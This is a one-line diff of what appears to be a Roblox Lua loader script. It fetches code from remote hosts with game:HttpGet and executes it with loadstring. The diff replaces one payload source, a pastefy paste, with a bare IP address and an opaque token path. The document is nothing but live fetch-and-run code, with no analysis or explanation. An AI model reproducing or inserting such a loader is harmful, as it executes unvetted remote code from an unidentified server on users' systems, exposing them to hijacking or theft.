@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/5OK8XFAQ/raw"))()end)loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()
+task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/5OK8XFAQ/raw"))()end)loadstring(game:HttpGet("http://84.200.89.110/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
